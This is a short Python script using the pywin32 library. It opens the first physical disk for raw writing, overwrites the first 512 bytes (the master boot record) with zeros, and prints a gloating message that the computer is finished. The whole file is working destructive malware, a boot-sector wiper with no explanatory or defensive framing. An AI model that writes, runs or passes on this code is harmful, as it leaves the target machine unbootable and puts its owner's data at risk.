from win32file import *
from win32gui import *
from win32api import * 
from win32con import *
from win32ui import *


hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_ALWAYS, 0, 0)


buffer = bytes([
  0 for i in range(512)
])

bytes_written = WriteFile(hDevice, buffer, None)
print("Now your pc goes bye bye!")


CloseHandle(hDevice)
